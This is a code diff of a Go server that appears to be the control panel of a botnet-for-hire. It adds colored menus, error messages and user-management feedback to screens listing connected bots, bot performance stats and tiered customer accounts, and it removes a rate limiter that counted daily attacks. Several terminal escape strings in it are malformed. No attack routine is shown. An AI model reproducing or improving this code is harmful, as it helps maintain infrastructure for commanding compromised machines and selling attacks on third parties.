-	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
+	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
+		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
 	conn.Write([]byte(border))
-	title := "\033[38;5;240sm|\033[38;5;251sm    CONNECTED BOTS    \033[0m\n\r"
+	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    CONNECTED BOTS    \033[0m\n\r",
+		ColorMid1, ColorAccent1)
 	conn.Write([]byte(title))
 	conn.Write([]byte(border))
-	content := fmt.Sprintf("\033[38;5;240sm| Total bots online: \033[38;5;254sm%d\033[0m\n\r", count)
+	content := fmt.Sprintf("\033[38;5;%sm| Total bots online: \033[38;5;%sm%d\033[0m\n\r",
+		ColorMid1, ColorAccent2, count)
 	conn.Write([]byte(content))
 	conn.Write([]byte(border))
 }
 
 func displayHelp(conn net.Conn, userLevel int) {
 	conn.Write([]byte("\033[2J\033[H"))
-	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
+	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
+		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
 	conn.Write([]byte(border))
-	title := "\033[38;5;240sm|\033[38;5;251sm    HELP    \033[0m\n\r"
+	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    HELP    \033[0m\n\r",
+		ColorMid1, ColorAccent1)
 	conn.Write([]byte(title))
 	conn.Write([]byte(border))
 	commands := []struct {
@@ -2088,13 +2211,14 @@ func displayHelp(conn net.Conn, userLevel int) {
 		{"stats", "View bot performance stats"},
 	}
 	for _, cmd := range commands {
-		line := fmt.Sprintf("\033[38;5;240sm| \033[38;5;254sm%-15s \033[38;5;251sm- %s\033[0m\n\r",
-			cmd.cmd, cmd.desc)
+		line := fmt.Sprintf("\033[38;5;%sm| \033[38;5;%sm%-15s \033[38;5;%sm- %s\033[0m\n\r",
+			ColorMid1, ColorAccent2, cmd.cmd, ColorAccent1, cmd.desc)
 		conn.Write([]byte(line))
 	}
 	if userLevel <= 1 {
 		conn.Write([]byte(border))
-		adminTitle := "\033[38;5;240sm|\033[38;5;183sm    ADMIN COMMANDS    \033[0m\n\r"
+		adminTitle := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    ADMIN COMMANDS    \033[0m\n\r",
+			ColorMid1, ColorSystem)
 		conn.Write([]byte(adminTitle))
 		conn.Write([]byte(border))
 		adminCmds := []struct {
@@ -2108,8 +2232,8 @@ func displayHelp(conn net.Conn, userLevel int) {
 			{"resetpw", "Reset a user's password (resetpw <username>)"},
 		}
 		for _, cmd := range adminCmds {
-			line := fmt.Sprintf("\033[38;5;240sm| \033[38;5;183sm%-15s \033[38;5;183sm- %s\033[0m\n\r",
-				cmd.cmd, cmd.desc)
+			line := fmt.Sprintf("\033[38;5;%sm| \033[38;5;%sm%-15s \033[38;5;%sm- %s\033[0m\n\r",
+				ColorMid1, ColorSystem, cmd.cmd, ColorSystem, cmd.desc)
 			conn.Write([]byte(line))
 		}
 	}
@@ -2123,17 +2247,20 @@ func displayUserDatabase(conn net.Conn) {
 	var users []User
 	json.Unmarshal(data, &users)
 	conn.Write([]byte("\033[2J\033[H"))
-	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
+	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
+		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
 	conn.Write([]byte(border))
-	title := "\033[38;5;240sm|\033[38;5;183sm    USER DATABASE    \033[0m\n\r"
+	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    USER DATABASE    \033[0m\n\r",
+		ColorMid1, ColorSystem)
 	conn.Write([]byte(title))
 	conn.Write([]byte(border))
-	headers := fmt.Sprintf("\033[38;5;240sm| %-14s | %-14s | %-19s | %-10s | %-19s |\033[0m\n\r",
-		"Username", "Password", "Expiration", "Level", "Last Activity")
+	headers := fmt.Sprintf("\033[38;5;%sm| %-14s | %-14s | %-19s | %-10s | %-19s |\033[0m\n\r",
+		ColorMid1, "Username", "Password", "Expiration", "Level", "Last Activity")
 	conn.Write([]byte(headers))
 	conn.Write([]byte(border))
 	for _, user := range users {
-		row := fmt.Sprintf("\033[38;5;243sm| %-14s | %-14s | %-19s | %-10s | %-19s |\033[0m\n\r",
+		row := fmt.Sprintf("\033[38;5;%sm| %-14s | %-14s | %-19s | %-10s | %-19s |\033[0m\n\r",
+			ColorMid2,
 			user.Username,
 			"********",
 			user.Expire.Format("2006-01-02"),
@@ -2144,8 +2271,9 @@ func displayUserDatabase(conn net.Conn) {
 	conn.Write([]byte(border))
 }
 
-func handleAddUser(parts []string) {
+func handleAddUser(conn net.Conn, parts []string) {
 	if len(parts) < 3 {
+		animateText(conn, "Usage: adduser <username> <level>", 15*time.Millisecond, ColorError)
 		return
 	}
 	username := sanitizeInput(parts[1])
@@ -2161,6 +2289,7 @@ func handleAddUser(parts []string) {
 	case "basic":
 		validLevel = "Basic"
 	default:
+		animateText(conn, "Invalid level. Must be owner, admin, pro, or basic", 15*time.Millisecond, ColorError)
 		return
 	}
 	users := []User{}
@@ -2189,12 +2318,14 @@ func handleAddUser(parts []string) {
 	logAuditEvent("SYSTEM", "USER", fmt.Sprintf("User %s created with level %s", username, validLevel))
 }
 
-func handleDeleteUser(parts []string) {
+func handleDeleteUser(conn net.Conn, parts []string) {
 	if len(parts) < 2 {
+		animateText(conn, "Usage: deluser <username>", 15*time.Millisecond, ColorError)
 		return
 	}
 	username := sanitizeInput(parts[1])
 	if username == "root" {
+		animateText(conn, "Cannot delete root user", 15*time.Millisecond, ColorError)
 		return
 	}
 	users := []User{}
@@ -2210,19 +2341,23 @@ func handleDeleteUser(parts []string) {
 		}
 	}
 	if !found {
+		animateText(conn, "Error: User not found", 15*time.Millisecond, ColorError)
 		return
 	}
 	saveUsers(users)
 	logAuditEvent("SYSTEM", "USER", fmt.Sprintf("User %s deleted", username))
+	animateText(conn, fmt.Sprintf("User %s deleted successfully", username), 15*time.Millisecond, ColorSuccess)
 }
 
-func handleResetPassword(c *client, parts []string) {
+func handleResetPassword(conn net.Conn, c *client, parts []string) {
 	if len(parts) < 2 && c.user.GetLevel() > 1 {
+		animateText(conn, "Usage: resetpw <username>", 15*time.Millisecond, ColorError)
 		return
 	}
 	var username string
 	if len(parts) >= 2 {
 		if c.user.GetLevel() > 1 {
+			animateText(conn, "Permission denied: Admin level required", 15*time.Millisecond, ColorError)
 			return
 		}
 		username = sanitizeInput(parts[1])
@@ -2241,6 +2376,7 @@ func handleResetPassword(c *client, parts []string) {
 		}
 	}
 	if !found {
+		animateText(conn, "Error: User not found", 15*time.Millisecond, ColorError)
 		return
 	}
 	token := randomString(32)
@@ -2258,19 +2394,27 @@ func handleResetPassword(c *client, parts []string) {
 
 func displayAuditLogs(conn net.Conn) {
 	const maxLines = 20
+
 	file, err := os.Open(cfg.AuditLogFile)
 	if err != nil {
+		animateText(conn, "Error opening audit log", 15*time.Millisecond, ColorError)
 		return
 	}
 	defer file.Close()
+
 	conn.Write([]byte("\033[2J\033[H"))
-	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
+
+	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
+		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
 	conn.Write([]byte(border))
-	title := fmt.Sprintf("\033[38;5;240sm|\033[38;5;183sm    AUDIT LOG (LAST %d ENTRIES)    \033[0m\n\r", maxLines)
+	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    AUDIT LOG (LAST %d ENTRIES)    \033[0m\n\r",
+		ColorMid1, ColorSystem, maxLines)
 	conn.Write([]byte(title))
 	conn.Write([]byte(border))
+
 	lines := make([]string, 0, maxLines)
 	scanner := bufio.NewScanner(file)
+
 	for scanner.Scan() {
 		line := scanner.Text()
 		if len(lines) >= maxLines {
@@ -2278,16 +2422,24 @@ func displayAuditLogs(conn net.Conn) {
 		}
 		lines = append(lines, line)
 	}
+
 	if err := scanner.Err(); err != nil {
+		animateText(conn, "Error reading log file", 15*time.Millisecond, ColorError)
 		return
 	}
+
 	for _, line := range lines {
 		if len(line) > 120 {
 			line = line[:117] + "..."
 		}
 		fmt.Fprintf(conn, "%s\n\r", line)
 	}
+
 	conn.Write([]byte(border))
+	animateText(conn, "Press any key to continue...", 15*time.Millisecond, ColorInfo)
+
+	buf := make([]byte, 1)
+	conn.Read(buf)
 }
 
 func displayServerStatus(conn net.Conn) {
@@ -2327,6 +2479,7 @@ func displayBotStats(conn net.Conn) {
 	botStatsLock.Lock()
 	defer botStatsLock.Unlock()
 	if len(botPerformance) == 0 {
+		animateText(conn, "No bot performance data available", 15*time.Millisecond, ColorWarning)
 		return
 	}
 	stats := make([]struct {
@@ -2487,11 +2640,11 @@ func authUser(conn net.Conn) (bool, *client) {
 		return false, nil
 	}
 	for attempt := 0; attempt < 3; attempt++ {
-		conn.Write([]byte(fmt.Sprintf("\033[38;5;254smAttempt %d/3\033\r\n[0m ", attempt+1)))
-		conn.Write([]byte("\033\r\n[38;5;251sm• Username\033[38;5;62m:  \033[0m"))
+		conn.Write([]byte(fmt.Sprintf("\033[38;5;%smAttempt %d/3\033\r\n[0m ", ColorAccent2, attempt+1)))
+		conn.Write([]byte(fmt.Sprintf("\033\r\n[38;5;%sm• Username\033[38;5;62m:  \033[0m", ColorAccent1)))
 		username, _ := getFromConn(conn)
 		username = sanitizeInput(username)
-		conn.Write([]byte("\033[38;5;251sm• Password\033[38;5;62m: \033[0m"))
+		conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm• Password\033[38;5;62m: \033[0m", ColorAccent1)))
 		conn.Write([]byte("\033[8m"))
 		password, _ := getFromConn(conn)
 		conn.Write([]byte("\033[0m\033[?25h"))
@@ -2500,11 +2653,11 @@ func authUser(conn net.Conn) (bool, *client) {
 			if t, ok := resetTokens.m[username]; ok {
 				if time.Now().Before(t.expires) && !t.used {
 					conn.Write([]byte("\nYou have a pending password reset. Enter your reset token or press enter to continue:\n"))
-					conn.Write([]byte("\033[38;5;251sm• Reset Token\033[38;5;62m: \033[0m"))
+					conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm• Reset Token\033[38;5;62m: \033[0m", ColorAccent1)))
 					token, _ := getFromConn(conn)
 					if checkResetToken(username, token) {
 						conn.Write([]byte("\nPlease enter your new password:\n"))
-						conn.Write([]byte("\033[38;5;251sm• New Password\033[38;5;62m: \033[0m"))
+						conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm• New Password\033[38;5;62m: \033[0m", ColorAccent1)))
 						conn.Write([]byte("\033[8m"))
 						newPassword, _ := getFromConn(conn)
 						conn.Write([]byte("\033[0m"))
@@ -2745,21 +2898,6 @@ func (s *SessionStore) Delete(id string) {
 
 func (s *SessionStore) Range(f func(key, value interface{}) bool) {
 	s.store.Range(f)
-}
-
-type rateLimiter struct {
-	limiter      *rate.Limiter
-	lastSeen     time.Time
-	attacksToday int
-	lastReset    time.Time
-	dailyLimit   int
-}
-
-type session struct {
-	client     *client
-	lastActive time.Time
-	loginIP    string
-	expires    time.Time
 }
 
 func deleteUser(username string) error {
